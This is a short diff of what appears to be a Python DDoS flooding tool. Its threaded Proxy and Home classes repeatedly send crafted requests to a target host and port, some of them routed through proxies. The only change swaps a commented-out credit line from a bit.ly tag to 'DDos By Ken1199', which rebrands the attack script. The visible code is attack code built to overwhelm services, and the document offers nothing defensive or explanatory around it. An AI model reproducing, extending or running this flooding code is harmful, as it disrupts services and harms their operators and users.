@@ -1008,7 +1008,7 @@ class Proxy(threading.Thread):
                 s.send(str.encode(request))
                 s.send(str.encode(request))
                 #req_code += 1
-                #sys.stdout.write("[!] bit.ly/AnonyV28 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
+                #sys.stdout.write("[!] DDos By Ken1199 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                 #sys.stdout.flush()
                 print("[!] Proxy @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                 try:
@@ -1160,7 +1160,7 @@ class Home(threading.Thread):
                 s.send(str.encode(request))
                 print("[+] Home @ " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                 #req_code += 1
-                #sys.stdout.write("[!] bit.ly/AnonyV28 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
+                #sys.stdout.write("[!] DDos By Ken1199 | Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                 #sys.stdout.flush()
                 try:
                     for y in range(multiple):
